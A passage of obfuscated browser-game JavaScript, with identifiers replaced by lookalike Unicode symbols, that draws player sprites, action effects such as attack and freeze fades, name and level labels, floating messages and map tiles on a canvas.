						if (ⵠⵠΔⲆⲆ >= Ⲇ.ᐃⲆⵠⵠⵠ) ⲆΔΔⵠΔ(ⵠⵠΔⲆⲆ, ᐃⵠ, -ᐃⵠ.width / ⲆᐃᐃΔ + (49 + Δⵠ) * ᐃ, -ᐃⵠ.height / ⲆΔⵠᐃ + ᐃ * (11 + ⲆⵠⲆ));
						else if (ⵠⵠΔⲆⲆ !== Ⲇ.ΔᐃᐃⵠΔ) ᐃΔⲆΔΔ(ⵠⵠΔⲆⲆ, this.ⲆⵠⲆᐃ, ᐃⵠ, -ᐃⵠ.width / 4 + (49 + Δⵠ) * ᐃ, -ᐃⵠ.height / ⵠⵠΔᐃΔ + (ⲆⵠΔΔᐃᐃᐃ + ⲆⵠⲆ) * ᐃ);
						else ᐃᐃⲆⲆⵠ(ⵠⵠΔⲆⲆ, ᐃⵠ, -ᐃⵠ.width / Ⲇⵠⵠᐃ + ᐃ * (49 + Δⵠ), -ᐃⵠ.height / 2 + ᐃ * (ᐃᐃⲆΔΔⲆᐃ + ⲆⵠⲆ));
						Δ.restore()
					}
				}
			} else {
				if (this.ᐃⲆΔᐃⲆᐃΔ) {
					ᐃᐃⲆⲆⵠ(ⵠⵠΔⲆⲆ, ᐃⵠ, -ᐃⵠ.width / 2 - (66 + Δⵠ) * ᐃ, -ᐃⵠ.height / Δᐃⵠⵠ + ᐃ * (ⵠᐃΔⵠ + ⲆⵠⲆ));
					ᐃᐃⲆⲆⵠ(ⵠⵠΔⲆⲆ, ᐃⵠ, -ᐃⵠ.width / 2 + (66 + Δⵠ) * ᐃ, -ᐃⵠ.height / ΔⲆΔΔΔ + (ᐃⲆⵠΔ + ⲆⵠⲆ) * ᐃ)
				} else {
					if (0 === ᐃⲆᐃⵠⵠⲆΔ) {
						ᐃᐃⲆⲆⵠ(Ⲇ.ΔᐃⲆᐃΔ, ᐃⵠΔⲆ, -ᐃⵠΔⲆ.width / ⵠⵠⵠΔ - ᐃ * (49 + Δⵠ), -ᐃⵠΔⲆ.height / ⲆᐃᐃⲆ + (ΔⵠΔᐃⵠ + ⲆⵠⲆ) * ᐃ);
						if (Ⲇ.ⵠⵠⲆⵠⲆ === this.right) {
							var ΔΔⲆⲆⵠⵠΔ = ⵠⲆ[this.right][this.ⵠⲆᐃⵠⵠ][ⲆⲆⲆ.time];
							ᐃΔⲆΔΔ(this.right, this.ⵠⲆᐃⵠⵠ, ΔΔⲆⲆⵠⵠΔ, -ΔΔⲆⲆⵠⵠΔ.width / ⲆⵠᐃⲆ - (62 + Δⵠ) * ᐃ, -ΔΔⲆⲆⵠⵠΔ.height / ᐃⵠⵠΔ + (ⲆⵠⲆ + 18) * ᐃ)
						} else ᐃⵠΔⲆΔⵠⵠ(this.right, Δⵠ, ⲆⵠⲆ);
						if (ⵠⵠΔⲆⲆ >= Ⲇ.ᐃⲆⵠⵠⵠ) ⲆΔΔⵠΔ(ⵠⵠΔⲆⲆ, ᐃⵠ, -ᐃⵠ.width / Ⲇⵠⵠⵠ - (49 + Δⵠ) * ᐃ, -ᐃⵠ.height / ⵠᐃΔΔ + (11 + ⲆⵠⲆ) * ᐃ);
						else ⵠⵠΔⲆⲆ !== Ⲇ.ΔᐃᐃⵠΔ ? ᐃΔⲆΔΔ(ⵠⵠΔⲆⲆ, this.ⲆⵠⲆᐃ, ᐃⵠ, -ᐃⵠ.width / ΔΔⵠⵠΔ - (49 + Δⵠ) * ᐃ, -ᐃⵠ.height / 4 + (ⲆΔᐃⵠᐃ + ⲆⵠⲆ) * ᐃ) : ᐃᐃⲆⲆⵠ(ⵠⵠΔⲆⲆ, ᐃⵠ, -ᐃⵠ.width / ⵠΔⲆᐃ - (49 + Δⵠ) * ᐃ, -ᐃⵠ.height / ⲆⵠΔΔ + (11 + ⲆⵠⲆ) * ᐃ);
						ᐃᐃⲆⲆⵠ(Ⲇ.ΔᐃⲆᐃΔ, ᐃⵠΔⲆ, -ᐃⵠΔⲆ.width / ⲆⲆΔᐃ + (49 + Δⵠ) * ᐃ, -ᐃⵠΔⲆ.height / ᐃⲆΔⲆ + ᐃ * (15 + ⲆⵠⲆ));
						if (Ⲇ.ᐃⲆⵠⵠⵠ <= ⵠⵠΔⲆⲆ) ⲆΔΔⵠΔ(ⵠⵠΔⲆⲆ, ᐃⵠ, -ᐃⵠ.width / 4 + ᐃ * (49 + Δⵠ), -ᐃⵠ.height / 4 + ᐃ * (11 + ⲆⵠⲆ));
						else ⵠⵠΔⲆⲆ !== Ⲇ.ΔᐃᐃⵠΔ ? ᐃΔⲆΔΔ(ⵠⵠΔⲆⲆ, this.ⲆⵠⲆᐃ, ᐃⵠ, -ᐃⵠ.width / 4 + ᐃ * (49 + Δⵠ), -ᐃⵠ.height / 4 + (ⲆΔᐃⵠᐃ + ⲆⵠⲆ) * ᐃ) : ᐃᐃⲆⲆⵠ(ⵠⵠΔⲆⲆ, ᐃⵠ, -ᐃⵠ.width / 2 + (49 + Δⵠ) * ᐃ, -ᐃⵠ.height / Δᐃⵠⵠ + (11 + ⲆⵠⲆ) * ᐃ)
					}
				}
			}
			if (this.ΔⵠΔᐃⲆ && this.Ⲇⵠᐃᐃᐃ < ⲆⵠⲆⲆ) {
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠᐃᐃⵠ][this.ⲆΔⲆⲆⵠⲆΔ][ⲆⲆⲆ.time];
				ᐃΔⲆΔΔ(Ⲇ.ⵠᐃᐃⵠ, this.ⲆΔⲆⲆⵠⲆΔ, ᐃⵠ, -ᐃⵠ.width / ᐃⵠⵠΔ, -ᐃⵠ.height / 4 - ᐃ * 39)
			}
			if (this.ᐃⲆΔᐃⲆᐃΔ) {
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃⲆⵠᐃⲆΔ][ⲆⲆⲆ.time];
				ᐃᐃⲆⲆⵠ(Ⲇ.ⲆᐃⲆⵠᐃⲆΔ, ᐃⵠ, -ᐃⵠ.width / 2, -ᐃⵠ.height / 2);
				this.ⵠΔⲆᐃᐃⲆⵠ.ⵠⲆᐃ();
				ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠᐃⵠⲆΔⵠ][ⲆⲆⲆ.time];
				ᐃᐃⲆⲆⵠ(Ⲇ.ⵠⵠᐃⵠⲆΔⵠ, ᐃⵠ, -ᐃⵠ.width / ⲆᐃᐃⲆ, -ᐃⵠ.height / ⵠⵠⵠΔ + this.ⵠΔⲆᐃᐃⲆⵠ.ΔᐃΔ)
			} else {
				var ᐃⵠ = ⵠⲆ[Ⲇ.Δᐃⵠᐃᐃ][this.ⲆⵠⲆᐃ][ⲆⲆⲆ.time];
				if (this.Ⲇⵠᐃᐃᐃ !== Ⲇ.ΔᐃᐃΔᐃ) {
					ᐃΔⲆΔΔ(Ⲇ.Δᐃⵠᐃᐃ, this.ⲆⵠⲆᐃ, ᐃⵠ, -ᐃⵠ.width / 4, -ᐃⵠ.height / 4);
					if (ⵠⲆⲆ < this.Δᐃᐃⵠᐃ) {
						var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⲆᐃᐃᐃ][this.Δᐃᐃⵠᐃ][ⲆⲆⲆ.time];
						ᐃΔⲆΔΔ(Ⲇ.ⲆⲆᐃᐃᐃ, this.Δᐃᐃⵠᐃ, ᐃⵠ, -ᐃⵠ.width / ΔᐃⵠⵠⲆ, -ᐃⵠ.height / 4)
					}
				}
			}
			if (this.action & ⵠⵠⵠⲆ.ⲆⲆᐃᐃⵠⵠΔ) {
				if (this.ΔΔᐃⵠⵠ.ⵠⲆᐃ() && this.ΔΔᐃⵠⵠ.ᐃⲆΔ == false) this.action -= ⵠⵠⵠⲆ.ⲆⲆᐃᐃⵠⵠΔ;
				Δ.globalAlpha = .6 - this.ΔΔᐃⵠⵠ.ΔᐃΔ;
				if (this.ᐃⲆΔᐃⲆᐃΔ) {
					var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃᐃⲆⲆΔᐃⵠ];
					ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / Δⵠⵠⵠ, -ᐃⵠ.height / 2)
				} else {
					var ᐃⵠ = ⵠⵠⵠΔⲆⲆΔ(this.ⲆⵠⲆᐃ, ⵠⲆ[Ⲇ.Δᐃⵠᐃᐃ][this.ⲆⵠⲆᐃ][0], ⲆᐃⲆⲆΔᐃⲆⵠⲆ);
					ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃⵠ.width / 4, ᐃⵠ.height / 4, -ᐃⵠ.width / 2, -ᐃⵠ.height / ΔⲆΔΔΔ)
				}
				Δ.globalAlpha = ⵠᐃⵠΔ
			}
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔⲆⲆΔⵠ) {
				if (this.ⲆᐃⵠⲆⵠΔⵠ.ⵠⲆᐃ() && this.ⲆᐃⵠⲆⵠΔⵠ.ᐃⲆΔ == ⲆⵠΔⵠΔ) this.action -= ⵠⵠⵠⲆ.ⵠΔΔⲆⲆΔⵠ;
				Δ.globalAlpha = .6 - this.ⲆᐃⵠⲆⵠΔⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠΔΔⲆⲆΔⵠ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / 2, -ᐃⵠ.height / 2);
				Δ.globalAlpha = 1
			}
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				this.Δᐃⵠ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃⲆΔ == false && (this.action -= ⵠⵠⵠⲆ.ⵠΔΔΔ);
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				if (this.ᐃⲆΔᐃⲆᐃΔ) {
					var ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔⵠⵠΔⲆᐃ];
					ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / 2, -ᐃⵠ.height / ⵠΔᐃᐃⵠ)
				} else {
					var ᐃⵠ = ⵠⵠⵠΔⲆⲆΔ(this.ⲆⵠⲆᐃ, ⵠⲆ[Ⲇ.Δᐃⵠᐃᐃ][this.ⲆⵠⲆᐃ][Ⲇᐃⵠⵠ], ΔᐃⵠⵠⲆⲆⵠⲆⵠ);
					ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃⵠ.width / ΔᐃⵠⵠⲆ, ᐃⵠ.height / 4, -ᐃⵠ.width / 2, -ᐃⵠ.height / 2)
				}
				Δ.globalAlpha = ΔⲆⵠ
			}
			if (this.action & ⵠⵠⵠⲆ.ΔⲆᐃⲆᐃ) {
				if (this.freeze.ⵠⲆᐃ() && false == this.freeze.ᐃⲆΔ) this.action -= ⵠⵠⵠⲆ.ΔⲆᐃⲆᐃ;
				Δ.globalAlpha = .6 - this.freeze.ΔᐃΔ;
				var ᐃⵠ = ⵠⵠⵠΔⲆⲆΔ(this.ⲆⵠⲆᐃ, ⵠⲆ[Ⲇ.Δᐃⵠᐃᐃ][this.ⲆⵠⲆᐃ][Δⵠᐃ], ᐃᐃΔᐃᐃⵠΔᐃⵠ);
				ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃⵠ.width / ΔΔⵠⵠΔ, ᐃⵠ.height / ⲆⲆⲆΔ, -ᐃⵠ.width / 2, -ᐃⵠ.height / ⲆΔΔⵠ);
				Δ.globalAlpha = ΔᐃⲆⵠ
			}
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔᐃᐃⲆⵠ) {
				this.ⲆⲆⲆⲆᐃᐃⵠ.ⵠⲆᐃ() && this.ⲆⲆⲆⲆᐃᐃⵠ.ᐃⲆΔ == false && (this.action -= ⵠⵠⵠⲆ.ⵠΔΔᐃᐃⲆⵠ);
				Δ.globalAlpha = .6 - this.ⲆⲆⲆⲆᐃᐃⵠ.ΔᐃΔ;
				if (this.ᐃⲆΔᐃⲆᐃΔ) {
					var ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔᐃᐃⵠΔΔ];
					ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / ᐃⲆΔⲆ, -ᐃⵠ.height / 2)
				} else {
					var ᐃⵠ = ⵠⵠⵠΔⲆⲆΔ(this.ⲆⵠⲆᐃ, ⵠⲆ[Ⲇ.Δᐃⵠᐃᐃ][this.ⲆⵠⲆᐃ][0], ΔⲆᐃΔⵠⲆΔⲆΔ);
					ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃⵠ.width / ⵠᐃᐃⲆ, ᐃⵠ.height / ⲆΔⵠᐃ, -ᐃⵠ.width / Δᐃⵠⵠ, -ᐃⵠ.height / ⵠΔⲆᐃ)
				}
				Δ.globalAlpha = 1
			}
			ΔΔΔΔⲆⲆⲆⲆⲆ(this.Ⲇⵠᐃᐃᐃ);
			if (ᐃⲆᐃⵠⵠⲆΔ === ⲆⵠⲆⲆ) {
				if (this.action & ⵠⵠⵠⲆ.ᐃⵠⵠᐃⵠⵠⵠ) Δⵠ += this.attack.ΔᐃΔ * 15;
				ᐃᐃⲆⲆⵠ(Ⲇ.ΔᐃⲆᐃΔ, ᐃⵠΔⲆ, -ᐃⵠΔⲆ.width / 2 - 26 * ᐃ, -ᐃⵠΔⲆ.height / Δᐃⵠⵠ + (31 + ⲆⵠⲆ + Δⵠ) * ᐃ);
				if (Ⲇ.ᐃⲆⵠⵠⵠ <= ⵠᐃᐃᐃᐃ) ⲆΔΔⵠΔ(ⵠᐃᐃᐃᐃ, ΔⲆⲆⲆᐃ, -ΔⲆⲆⲆᐃ.width / ⵠΔΔᐃΔ - ᐃ * 26, -ΔⲆⲆⲆᐃ.height / 4 + ᐃ * (27 + ⲆⵠⲆ + Δⵠ));
				else Ⲇ.ΔᐃᐃⵠΔ !== ⵠᐃᐃᐃᐃ ? ᐃΔⲆΔΔ(ⵠᐃᐃᐃᐃ, this.ⲆⵠⲆᐃ, ΔⲆⲆⲆᐃ, -ΔⲆⲆⲆᐃ.width / ΔⲆⲆⲆ - 26 * ᐃ, -ΔⲆⲆⲆᐃ.height / 4 + ᐃ * (27 + ⲆⵠⲆ + Δⵠ)) : ᐃᐃⲆⲆⵠ(ⵠᐃᐃᐃᐃ, ΔⲆⲆⲆᐃ, -ΔⲆⲆⲆᐃ.width / 2 - 26 * ᐃ, -ΔⲆⲆⲆᐃ.height / 2 + ᐃ * (27 + ⲆⵠⲆ + Δⵠ));
				ᐃᐃⲆⲆⵠ(Ⲇ.ΔᐃⲆᐃΔ, ᐃⵠΔⲆ, -ᐃⵠΔⲆ.width / 2 + 26 * ᐃ, -ᐃⵠΔⲆ.height / 2 + (31 + ⲆⵠⲆ + Δⵠ) * ᐃ);
				if (ⵠᐃᐃᐃᐃ >= Ⲇ.ᐃⲆⵠⵠⵠ) ⲆΔΔⵠΔ(ⵠᐃᐃᐃᐃ, ΔⲆⲆⲆᐃ, -ΔⲆⲆⲆᐃ.width / 4 + ᐃ * 26, -ΔⲆⲆⲆᐃ.height / 4 + (27 + ⲆⵠⲆ + Δⵠ) * ᐃ);
				else Ⲇ.ΔᐃᐃⵠΔ !== ⵠᐃᐃᐃᐃ ? ᐃΔⲆΔΔ(ⵠᐃᐃᐃᐃ, this.ⲆⵠⲆᐃ, ΔⲆⲆⲆᐃ, -ΔⲆⲆⲆᐃ.width / ⵠΔΔᐃΔ + ᐃ * 26, -ΔⲆⲆⲆᐃ.height / ⲆⵠᐃΔ + ᐃ * (27 + ⲆⵠⲆ + Δⵠ)) : ᐃᐃⲆⲆⵠ(ⵠᐃᐃᐃᐃ, ΔⲆⲆⲆᐃ, -ΔⲆⲆⲆᐃ.width / ΔⲆΔΔΔ + 26 * ᐃ, -ΔⲆⲆⲆᐃ.height / 2 + ᐃ * (27 + ⲆⵠⲆ + Δⵠ));
				ⲆᐃⲆᐃΔᐃᐃⵠΔ(this.right, ΔΔⵠ, ⲆⵠⲆ + Δⵠ)
			}
			Δ.restore();
			if (Settings.ShowHoodNames.enabled || this.Ⲇⵠᐃᐃᐃ !== Ⲇ.ⲆⵠᐃΔΔ && Ⲇ.ΔᐃᐃΔᐃ !== this.Ⲇⵠᐃᐃᐃ) {
				if (0 < this.ⵠΔΔⲆΔ) {
					!this.ⵠΔⲆΔ.ᐃΔⲆΔᐃⲆⵠ && (this.ⵠΔⲆΔ.ᐃΔⲆΔᐃⲆⵠ = ᐃᐃΔΔᐃ(ᐃ, this.ⵠΔⲆΔ.ⵠΔⵠⲆᐃ, 20, ⵠ[272], ⵠ[481], 2, null, null, ᐃ * 300));
					var ᐃⵠ = this.ⵠΔⲆΔ.ᐃΔⲆΔᐃⲆⵠ
				} else {
					if (!this.ⵠΔⲆΔ.label) this.ⵠΔⲆΔ.label = ᐃᐃΔΔᐃ(ᐃ, this.ⵠΔⲆΔ.ⵠΔⵠⲆᐃ, ⵠᐃΔᐃᐃ, ⵠ[253], ⵠ[481], 2, null, null, 300 * ᐃ);
					var ᐃⵠ = this.ⵠΔⲆΔ.label
				}
				ⲆⲆⲆ.ᐃΔⲆ == Ⲇ.ΔⲆΔ && (Δ.globalAlpha = .5);
				var Δⵠ = Math.floor(-ᐃⵠ.width / 2);
				var ⲆⵠⲆ = Math.floor(-ᐃⵠ.height / ᐃⲆΔⲆ - ᐃ * 70);
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ, ⲆⵠⲆ);
				if (this.ⵠΔⲆΔ.level > ΔᐃΔΔ) {
					var ⵠⵠΔᐃ = Δⵠ + ᐃⵠ.width + ⵠⵠΔⵠ;
					ᐃⵠ = ⵠⲆ[Ⲇ.ᐃΔᐃⲆⲆΔᐃ];
					if (ᐃᐃⵠᐃᐃ === ⲆⲆΔᐃⲆΔᐃ[this.ⵠΔⲆΔ.level]) ⲆⲆΔᐃⲆΔᐃ[this.ⵠΔⲆΔ.level] = ᐃᐃΔΔᐃ(ᐃ, "[" + this.ⵠΔⲆΔ.level + "]", ⲆᐃᐃΔΔ, "#F9E8A2", ⵠ[481], Ⲇᐃᐃⵠ, null, null, 50 * ᐃ);
					ΔⲆΔⵠ(Δ, ⲆⲆΔᐃⲆΔᐃ[this.ⵠΔⲆΔ.level], ⵠⵠΔᐃ, ⲆⵠⲆ)
				}
				Δ.globalAlpha = ᐃΔᐃⲆ
			} else {
				var ⲆⵠⲆ = Math.floor(-70 * ᐃ);
				var Δⵠ = Math.floor(ⵠⲆ[Ⲇ.ⵠᐃᐃⵠᐃᐃΔ].width / 1.5)
			}
			if (ᐃᐃΔ.ⵠᐃⲆΔΔΔΔ(this.ⲆⵠⵠΔ)) {
				if (ᐃᐃΔ.ⲆᐃⵠⲆΔ[ⵠⲆⲆ] == this.ⲆⵠⵠΔ) var ᐃⵠ = ⵠⲆ[Ⲇ.ΔⲆⵠⲆΔᐃΔ];
				else var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠᐃᐃⵠᐃᐃΔ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ - ᐃⵠ.width - 5, ⲆⵠⲆ - 6)
			}
			Δ.restore()
		}

		function ΔᐃⲆⲆⵠⵠⲆⵠΔ(Ⲇᐃ, ⵠΔⲆⲆ) {
			if (this.text) {
				if (!this.timeout.ᐃⲆΔ) Δ.globalAlpha = 1;
				else Δ.globalAlpha = 1 - this.timeout.ΔᐃΔ;
				if (!this.label) this.label = ᐃᐃΔΔᐃ(ᐃ, this.text, 40, Ⲇᐃ, null, null, null, null, null, ⵠΔⲆⲆ, ⲆⵠⲆⵠⲆ);
				ΔⲆΔⵠ(Δ, this.label, (ΔΔΔᐃ - this.label.width) / ᐃⲆΔⲆ, ᐃ * 50);
				Δ.globalAlpha = 1;
				this.timeout.ⵠⲆᐃ() && this.timeout.ᐃⲆΔ == false && (this.text = this.list.shift(), this.label = null)
			}
		}

		function ⵠᐃⲆⲆⵠΔᐃᐃᐃ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			if (this.text.length > Δᐃᐃᐃ) {
				for (var ⵠᐃ = 0; this.text.length > ⵠᐃ && Ⲇᐃᐃⵠ > ⵠᐃ; ⵠᐃ++) {
					!this.label[ⵠᐃ] && (this.label[ⵠᐃ] = ⵠΔⲆᐃⲆⵠⵠᐃⲆ(ᐃ, this.text[ⵠᐃ]), this.ᐃⲆᐃΔᐃΔᐃ[ⵠᐃ] = 0, this.ⵠᐃΔⵠΔⲆⲆ[ⵠᐃ] = ᐃⵠΔ);
					if (ⵠᐃ === 1) this.ⵠᐃΔⵠΔⲆⲆ[0] = ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(this.ⵠⲆⵠᐃⵠⵠΔ) * 30
				}
				this.ᐃⲆᐃΔᐃΔᐃ[ᐃⵠⲆ] += ᐃⵠᐃᐃ;
				if (1 < this.text.length) {
					this.ⵠⲆⵠᐃⵠⵠΔ = Math.min(this.ⵠⲆⵠᐃⵠⵠΔ + ᐃⵠᐃᐃ, ⵠΔⵠΔ);
					ⵠΔⵠΔ < this.ᐃⲆᐃΔᐃΔᐃ[0] && .5 < this.ⵠⲆⵠᐃⵠⵠΔ && (this.ᐃⲆᐃΔᐃΔᐃ[1] += ᐃⵠᐃᐃ)
				}
				for (var ⵠᐃ = 0; this.text.length > ⵠᐃ && ⵠᐃ < ᐃⲆΔⲆ; ⵠᐃ++) {
					var ⵠᐃⲆΔⵠ = this.ᐃⲆᐃΔᐃΔᐃ[ⵠᐃ];
					if (0 < ⵠᐃⲆΔⵠ) {
						if (ⵠᐃⲆΔⵠ < .25) Δ.globalAlpha = 4 * ⵠᐃⲆΔⵠ;
						else if (ⵠᐃⲆΔⵠ > 3.75) Δ.globalAlpha = Math.max((ⵠΔΔᐃΔ - ⵠᐃⲆΔⵠ) * 4, 0);
						else Δ.globalAlpha = 1;
						ΔⲆΔⵠ(Δ, this.label[ⵠᐃ], -this.label[ⵠᐃ].width / 2, -this.ⵠᐃΔⵠΔⲆⲆ[ⵠᐃ] + -this.label[ⵠᐃ].height / ᐃⲆⵠᐃΔ - 110 * ᐃ)
					}
				}
				this.ᐃⲆᐃΔᐃΔᐃ[ⵠᐃⲆᐃ] > ⵠⲆⵠᐃ && (this.ᐃⲆᐃΔᐃΔᐃ.shift(), this.text.shift(), this.ⵠᐃΔⵠΔⲆⲆ.shift(), this.label.shift(), this.ⵠⲆⵠᐃⵠⵠΔ = 0)
			}
			Δ.restore()
		}

		function ᐃⲆⵠΔⲆⵠΔᐃᐃ() {
			if (this.message !== undefined) {
				var ⲆⵠⲆ = Δᐃᐃⵠ < ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ.length ? -95 : 0;
				ΔⲆΔⵠ(Δ, this.message, ⵠΔⲆⵠ, ⵠⲆᐃⲆ - this.message.height + ⲆⵠⲆ)
			}
		}
		var ᐃⵠⲆⲆᐃⲆᐃ = 0;

		function ⲆΔᐃⵠⲆᐃⲆ(ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, ᐃΔ, ΔᐃⲆ, ᐃᐃᐃᐃ, ⵠᐃΔᐃ) {
			if (ⵠᐃΔᐃ === undefined) ⵠᐃΔᐃ = 0;
			for (var ⵠᐃⲆⲆ = ᐃᐃᐃᐃ; ⵠᐃⲆⲆ >= ⵠᐃΔᐃ; ⵠᐃⲆⲆ--) {
				for (var ⵠᐃ = ⲆᐃⵠΔ; ⵠᐃ <= ⲆⲆᐃΔ; ⵠᐃ++) {
					for (var ᐃⵠᐃⵠ = ΔⲆΔⲆ; ᐃⵠᐃⵠ <= ⵠⵠⲆⵠ; ᐃⵠᐃⵠ++) {
						var ⵠᐃᐃᐃ = ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ];
						if (!ⵠᐃᐃᐃ || !ⵠᐃᐃᐃ[ΔᐃⲆ]) continue;
						var ᐃⲆΔ = ⵠᐃᐃᐃ[ΔᐃⲆ][ⵠᐃⲆⲆ];
						if (ᐃⲆΔ === ΔΔⵠᐃΔ) continue;
						for (var ⲆⲆⵠΔ = 0; ⲆⲆⵠΔ < ᐃⲆΔ.length; ⲆⲆⵠΔ++) {
							var ⲆⵠⵠΔΔ = ᐃⲆΔ[ⲆⲆⵠΔ];
							var ᐃⵠ = ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time][ⵠᐃⲆⲆ];
							var ⵠⵠⵠΔⵠⵠⵠ = (ᐃⵠⲆⲆᐃⲆᐃ + (ⵠᐃ + ᐃⵠᐃⵠ) * ⲆᐃΔᐃ) % 60;
							var ⵠᐃⲆΔⵠ = ⵠⵠⵠΔⵠⵠⵠ < 30 ? ⵠⵠⵠΔⵠⵠⵠ / 30 : ΔⵠⲆΔ - (ⵠⵠⵠΔⵠⵠⵠ - 30) / 30;
							var ᐃⵠⵠ = -ᐃⵠ.width * (ΔⲆᐃᐃ + ⵠᐃⲆΔⵠ * .9 / 30);
							var ⵠⵠᐃ = -ᐃⵠ.height * (1 + ⵠᐃⲆΔⵠ * .9 / 30);
							ⵠⵠⵠΔⵠⵠⵠ = (ᐃⵠⲆⲆᐃⲆᐃ + (ⵠᐃ + ᐃⵠᐃⵠ) * ⵠΔᐃⵠⵠ) % 60;
							ⵠᐃⲆΔⵠ = 30 > ⵠⵠⵠΔⵠⵠⵠ ? ⵠⵠⵠΔⵠⵠⵠ / 30 : ΔΔᐃⵠ - (ⵠⵠⵠΔⵠⵠⵠ - 30) / 30;
							var ᐃΔΔᐃ = Δ.globalAlpha;
							Δ.globalAlpha = (.9 + ⵠᐃⲆΔⵠ * .1) * ᐃΔΔᐃ;
							ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃᐃΔ.ⲆΔΔ.x + ⲆⵠⵠΔΔ.x - ᐃⵠⵠ / 2, ᐃᐃΔ.ⲆΔΔ.y + ⲆⵠⵠΔΔ.y - ⵠⵠᐃ / ΔⲆΔΔΔ, ᐃⵠⵠ, ⵠⵠᐃ);
							Δ.globalAlpha = ᐃΔΔᐃ
						}
					}
				}
			}
		}

		function ⵠⲆⵠⵠⲆⵠⵠ(ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, ᐃΔ, ΔᐃⲆ, ᐃᐃᐃᐃ, ⵠᐃΔᐃ) {
			ᐃⲆᐃⲆⲆ === ⵠᐃΔᐃ && (ⵠᐃΔᐃ = 0);
			ⲆⲆⲆ.ᐃΔⲆⲆ[ᐃΔ].ⵠⲆᐃ();
			for (var ⵠᐃⲆⲆ = ᐃᐃᐃᐃ; ⵠᐃⲆⲆ >= ⵠᐃΔᐃ; ⵠᐃⲆⲆ--) {
				for (var ⵠᐃ = ⲆᐃⵠΔ; ⵠᐃ <= ⲆⲆᐃΔ; ⵠᐃ++) {
					for (var ᐃⵠᐃⵠ = ΔⲆΔⲆ; ⵠⵠⲆⵠ >= ᐃⵠᐃⵠ; ᐃⵠᐃⵠ++) {
						var ⵠᐃᐃᐃ = ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ];
						if (!ⵠᐃᐃᐃ || !ⵠᐃᐃᐃ[ΔᐃⲆ]) continue;
						var ᐃⲆΔ = ⵠᐃᐃᐃ[ΔᐃⲆ][ⵠᐃⲆⲆ];
						if (undefined === ᐃⲆΔ) continue;
						for (var ⲆⲆⵠΔ = Ⲇᐃⵠⵠ; ⲆⲆⵠΔ < ᐃⲆΔ.length; ⲆⲆⵠΔ++) {
							var ⲆⵠⵠΔΔ = ᐃⲆΔ[ⲆⲆⵠΔ];
							if (ⲆⵠⵠΔΔ.ⵠⲆᐃ) {
								if (ⲆⵠⵠΔΔ.Δᐃⵠ.ⵠⲆᐃ() && ⲆⵠⵠΔΔ.Δᐃⵠ.ᐃⲆΔ == ⲆΔⵠⲆΔ) {
									ⲆⵠⵠΔΔ.ⵠⲆᐃ = ΔᐃᐃⲆⲆ
								}
								var ΔᐃΔ = ᐃ * ((1 - ⲆⵠⵠΔΔ.Δᐃⵠ.ΔᐃΔ) * ᐃⵠᐃᐃ * 600);
								var Δⵠ = ΔᐃΔ * Math.sin(ⲆⵠⵠΔΔ.angle);
								var ⲆⵠⲆ = Math.cos(ⲆⵠⵠΔΔ.angle) * ΔᐃΔ
							} else {
								var Δⵠ = 0;
								var ⲆⵠⲆ = 0
							}
							var ᐃⵠ = ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time][ⵠᐃⲆⲆ];
							var ᐃⵠⵠ = ⲆⲆⲆ.ᐃΔⲆⲆ[ᐃΔ].ΔᐃΔ * -ᐃⵠ.width;
							var ⵠⵠᐃ = ⲆⲆⲆ.ᐃΔⲆⲆ[ᐃΔ].ΔᐃΔ * -ᐃⵠ.height;
							ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃᐃΔ.ⲆΔΔ.x + ⲆⵠⵠΔΔ.x - ᐃⵠⵠ / ⵠΔⲆᐃ + Δⵠ, ᐃᐃΔ.ⲆΔΔ.y + ⲆⵠⵠΔΔ.y - ⵠⵠᐃ / 2 + ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ)
						}
					}
				}
			}
		}
		var ⲆⵠᐃΔᐃⲆⲆ = [];
		for (var ⵠᐃ = 0; ⵠᐃ < ᐃᐃⲆⲆⲆⲆⲆ; ⵠᐃ++) {
			var ⲆⲆⵠ = 1;
			if (Math.random() < .25) ⲆⲆⵠ = 0;
			ⲆⵠᐃΔᐃⲆⲆ.push(ⲆⲆⵠ)
		}
		ΔΔⵠᐃⲆ = 1;

